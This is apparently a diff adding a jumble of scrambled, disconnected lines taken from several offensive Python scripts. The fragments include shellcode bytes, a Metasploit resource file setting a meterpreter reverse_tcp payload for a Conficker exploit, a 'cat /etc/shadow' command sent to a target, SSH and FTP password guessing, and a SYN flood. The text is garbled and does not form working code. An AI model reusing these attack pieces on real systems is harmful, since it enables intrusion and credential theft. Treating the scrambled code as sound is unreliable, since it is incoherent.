@@ -1,0 +1,113 @@
+    seqNum = 0
+        return geoLoc
+        exit(0)
+connection_lock = BoundedSemaphore(value=maxConnections)
+s.send(command +" " + crash + "\r\\n")
+    if username == None or password == None:
+    send(synPkt)
+try:
+    except Exception, e:
+send_command(s, 'cat /etc/shadow | grep root')
+shellcode = ("\xbf\x5c\x2a\x11\xb3\xd9\xe5\xd9\x74\x24\xf4\x5d\x33\xc9" 
+          "\NetworkList\Signatures\Unmanaged"
+    if pkt.haslayer(DNSRR):
+"\xea\xc9\xf3\x7d\x78\x02\xc0\x9c\x7f\x0f\x60\xd6\xb8\xd8" 
+    if rLat:
+    c = conn.cursor()
+import os
+from threading import *
+            kmlPts = kmlPts + srcKML + dstKML
+        opt = ' -o PasswordAuthentication=no'
+        screenLock.release()
+    parser.add_option('-p', dest='tgtPort', type='string',help='specify target port[s] separated by comma')
+    configFile = open('meta.rc', 'w')
+    browser.set_proxies(proxy)
+                      help='specify wigle username')
+        synSpoof = options.synSpoof
+        child = pexpect.spawn(connStr)
+import time
+        screenLock.acquire()
+        user = value.split('\\')[-1]
+        if passwdFile != None:
+        TCPlayer = TCP(sport=sport, dport=513)
+        return imgFileName
+    for ch in val:
+import optparse
+ftp.login(userName, passWord)
+            if Fails > 5:
+        if 'read_nonblocking' in str(e):
+            tcp = ip.data
+    parser.add_option('-i', dest='iface', type='string',help='specify network interface')
+def connect(host, user, password):
+        skypeDB = os.path.join(pathName, 'main.db')
+from IPy import IP as IPTEST
+    kmlPts = ''
+            dnsRecords[rrname] = []
+    (options, args) = parser.parse_args()
+    parser = optparse.OptionParser("usage %prog "+"-p <firefox profile path> ")
+        c = conn.cursor()
+            printGoogle(placesDB)
+    if abs(int(ttl) - int(ttlValues[ipsrc])) > THRESH:
+            dnsRecords[rrname].append(rdata)
+        mapLat = rLat[0].split('&')[0].split('=')[1]
+def testUserAgent(url, userAgent):
+    conn = sqlite3.connect(placesDB)
+                tgtHosts.append(host)
+addClient('127.0.0.1', 'root', 'toor')
+    configFile.write('setg DisablePayloadHandler 1\\n')
+        passWord = line.split(':')[1].strip('\r').strip('\\n')
+        soup = BeautifulSoup(html)
+    configFile.write('set RHOST ' + str(tgtHost) + '\\n')
+      'windows/meterpreter/reverse_tcp\\n')
+        confickerExploit(configFile, tgtHost, lhost, lport)
+    for recycleDir in dirs:
+            return (userName, passWord)
+    password = options.password
+            ftp = ftplib.FTP(hostname)
+        link_finder = re.compile('href="(.*?)"')
+"\xba\x1e\x53\x31")
+        latitude = rec['latitude']
+host = '192.168.95.179'
+        text = result['content']
+from scapy.all import *
+def synFlood(src, tgt):
+    dirList = os.listdir(recycleDir)
+        dirList = ftp.nlst()
+            r = re.findall(r'q=.*\&', url)
+       "SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList"
+                            '[P|p]assword:'])
+    addr = ''
+from _winreg import *
+    rec = gi.record_by_name(ip)
+import json
+        Found = True
+        except:
+    if options.thresh != None:
+    for cookie in ab.cookie_jar:
+passWord = 'guest'
+def val2addr(val):
+        url = str(row[0])
+       connection_lock.acquire()
+        src = options.src
+    for pkt in pkts:
+        configFile.write('exploit -j -z\\n')
+            wiglePrint(username, password, macAddr)
+url = 'http://ip.nefsc.noaa.gov/'
+        self.user = user
+printCookies(url)
+userAgent = [('User-agent', 'Mozilla/5.0 (X11; U; '+  'Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01')]
+"\x19\xe6\x91\x65\x94\xf6\xd6\x42\x46\x8d\x2c\xb1\xfb\x96" 
+    kmlheader = '<?xml version="1.0" encoding="UTF-8"?><kml xmlns="http://www.opengis.net/kml/2.2">\\n<Document>\\n'
+                try:
+        return True
+    country = rec['country_name']
+time.sleep(4)
+from bs4 import BeautifulSoup
+    page = browser.open(url)
+            preNum = seqNum
+            Stop = True
+    return addr
+    if rLon:
+import sqlite3
+    parser.add_option('-u', dest='url', type='string',  help='specify url address')
+def printGoogle(placesDB):
